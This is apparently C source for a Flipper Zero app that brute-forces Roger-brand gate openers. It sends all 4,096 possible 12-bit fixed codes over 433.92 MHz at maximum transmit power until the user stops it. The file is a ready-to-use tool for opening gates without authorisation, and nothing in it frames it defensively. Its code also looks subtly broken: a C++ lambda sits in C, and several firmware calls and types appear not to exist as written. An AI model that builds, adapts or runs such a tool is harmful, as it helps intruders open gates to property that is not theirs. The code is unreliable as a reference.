// Roger gate App for Flipper Zero
#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <subghz/subghz.h>
#include <input/input.h>

#define ROGER_FREQ 433920000
#define MAX_ATTEMPTS 4096
#define SEND_DELAY_US 50000

static bool keep_running = true;

void send_fixed_code(uint16_t code) {
    SubGhzTxConfig tx_cfg = {
        .frequency = ROGER_FREQ,
        .bitrate = 2000,
        .protocol_id = SubGhzProtocolCustom,
        .modulation = SubGhzModulationOok,
        .tx_power = SubGhzTxPowerMax,
    };

    uint8_t buffer[64] = {0};
    uint8_t bit_count = 0;
    for(int i = 11; i >= 0; i--) {
        buffer[bit_count++] = (code >> i) & 1 ? 0xF0 : 0x0F;
    }

    subghz_send_custom_raw(&tx_cfg, buffer, bit_count, true);
    furi_delay_us(SEND_DELAY_US);
}

int32_t roger_gate_app(void* p) {
    UNUSED(p);
    uint16_t current_code = 0;

    ViewPort* view = view_port_alloc();
    view_port_draw_callback_set(view, [](Canvas* canvas, void* ctx) {
        canvas_draw_str(canvas, 5, 15, "Roger gate");
        canvas_draw_str(canvas, 5, 30, "Press BACK to stop");
    }, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view, GuiLayerFullscreen);

    InputEvent event;
    Input* input = furi_record_open(RECORD_INPUT);

    while(keep_running && current_code < MAX_ATTEMPTS) {
        send_fixed_code(current_code);

        if(input_poll_event(input, &event, 10)) {
            if(event.type == InputTypeShort && event.key == InputKeyBack) {
                keep_running = false;
                break;
            }
        }

        current_code++;
    }

    gui_remove_view_port(gui, view);
    view_port_free(view);
    return 0;
}
